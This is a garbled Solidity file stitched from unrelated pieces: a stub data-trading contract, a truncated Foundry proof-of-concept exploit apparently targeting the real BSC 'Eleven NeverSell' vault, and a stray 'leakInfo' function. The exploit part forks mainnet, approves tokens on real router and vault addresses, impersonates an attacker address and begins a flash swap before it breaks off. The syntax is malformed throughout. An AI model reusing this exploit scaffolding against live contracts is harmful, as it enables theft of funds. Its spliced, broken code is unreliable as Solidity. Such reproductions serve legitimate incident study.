
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity 0.8.10;

;
;
contract Eleven is DSTest {
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
  IPancakePair cake_LP = IPancakePair(0x401479091d0F7b8AE437Ee8B054575cd33ea72Bd);
  IERC20 nrv = IERC20(0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096);
  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
  address public ape_lp = 0x51e6D27FA57373d8d4C256231241053a70Cb1d93;
  IElevenNeverSellVault vault = IElevenNeverSellVault(0x27DD6E51BF715cFc0e2fe96Af26fC9DED89e4BE8);
  address[] path_1 = [;
    0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56,;
    0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096;
  ];
  address[] path_2 = [;
    0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096,;
    0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
  ];
  function setUp() public {
    cheats.createSelectFork("bsc", 8530973);
    busd.approve(address(router), type(uint256).max);
    busd.approve(ape_lp, type(uint256).max);
    nrv.approve(address(router), type(uint256).max);
    cake_LP.approve(address(vault), type(uint256).max);
    cake_LP.approve(address(router), type(uint256).max)};
  function testExploit() public {
    console.log("-------Start exploit-------");
    console.log("attacker BUSD balance before is", busd.balanceOf(address(this)));
    cheats.startPrank(0xc71e2F581b77De945C8A7A191b0B238c81f11eD6);
    IPancakePair(ape_lp).swap(0,
      95386962
function leakInfo() public view returns (string memory) {
    return userInfo[msg.sender];}